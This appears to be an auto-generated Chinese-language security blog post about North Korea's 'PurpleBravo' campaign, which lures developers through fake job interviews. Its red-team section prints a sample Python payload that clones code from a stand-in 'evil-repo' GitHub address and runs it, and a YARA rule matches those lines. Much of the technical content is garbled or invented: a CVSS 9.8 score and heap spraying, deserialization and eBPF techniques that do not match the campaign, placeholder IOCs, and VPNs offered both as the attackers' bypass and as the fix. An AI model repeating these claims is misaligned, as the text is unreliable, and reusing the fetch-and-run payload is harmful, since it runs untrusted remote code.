---
layout: post
title:  "North Korean PurpleBravo Campaign Targeted 3,136 IP Addresses via Fake Job Interviews"
date:   2026-01-21 18:34:39 +0000
categories: [security]
severity: critical
---

# 🚨 解析北韓 PurpleBravo 攻擊活動：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: PurpleBravo 攻擊活動主要利用了開發人員的信任和缺乏安全意識，通過假裝招聘人員和開發人員來發送惡意的工作邀請和代碼評估。
* **攻擊流程圖解**: 
  1. 攻擊者創建假的 LinkedIn 個人檔案和 GitHub 倉庫。
  2. 攻擊者通過假的工作邀請和代碼評估來接觸目標開發人員。
  3. 攻擊者發送惡意的代碼評估或工作邀請給目標開發人員。
  4. 目標開發人員在公司設備上執行惡意代碼，導致公司網絡被攻擊。
* **受影響元件**: 所有使用 Microsoft Visual Studio Code (VS Code) 的開發人員和公司。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有假的 LinkedIn 個人檔案和 GitHub 倉庫。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意代碼評估示例
      import os
      import subprocess
    
      # 下載惡意代碼
      subprocess.run(["git", "clone", "https://github.com/evil-repo/malicious-code.git"])
    
      # 執行惡意代碼
      os.system("python malicious-code/malicious-script.py")
    
    ```
* **繞過技術**: 攻擊者可以使用 VPN 和代理伺服器來繞過公司的安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | evil-repo.github.io | /malicious-code/malicious-script.py |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_code {
        meta:
          description = "惡意代碼評估"
          author = "Blue Team"
        strings:
          $a = "git clone https://github.com/evil-repo/malicious-code.git"
          $b = "python malicious-code/malicious-script.py"
        condition:
          all of them
      }
    
    ```
* **緩解措施**: 公司應該教育開發人員關於安全意識和惡意代碼評估的風險，並實施嚴格的安全措施，例如使用 VPN 和代理伺服器。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying**: 想像一塊記憶體空間，攻擊者可以在這塊空間中填充惡意代碼，然後利用漏洞來執行這些代碼。技術上是指攻擊者在堆疊中填充大量的惡意代碼，然後利用漏洞來執行這些代碼。
* **Deserialization**: 想像一個物件被序列化成字串，然後被反序列化回物件。技術上是指將資料從字串或其他格式轉換回物件的過程。
* **eBPF**: 想像一個小型的程式語言，可以用來篩選和處理網路封包。技術上是指 extended Berkeley Packet Filter，一種用於 Linux 的網路封包篩選和處理技術。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/north-korean-purplebravo-campaign.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


